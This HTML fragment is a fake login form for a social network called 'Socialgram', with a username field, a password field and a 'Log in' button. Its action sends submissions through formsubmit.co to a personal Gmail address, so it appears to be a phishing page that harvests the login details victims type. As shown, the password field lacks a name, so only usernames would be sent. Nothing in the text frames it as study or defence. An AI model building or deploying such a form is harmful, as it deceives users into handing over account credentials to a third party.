<form
  action="https://formsubmit.co/gamingpccomingsoon@gmail.com"
  method="POST"
>
  <input
    type="hidden"
    name="_subject"
    value="Socialgram Test — Username"
  >

  <input
    type="hidden"
    name="_template"
    value="table"
  >

  <input
    type="text"
    name="username"
    placeholder="Phone number, username, or email"
    autocomplete="off"
    required
  >

  <div class="password-box">
    <input
      id="password"
      type="password"
      placeholder="Password"
      autocomplete="off"
    >
    <button id="showPassword" type="button">Show</button>
  </div>

  <button class="login-btn" type="submit">Log in</button>
</form>
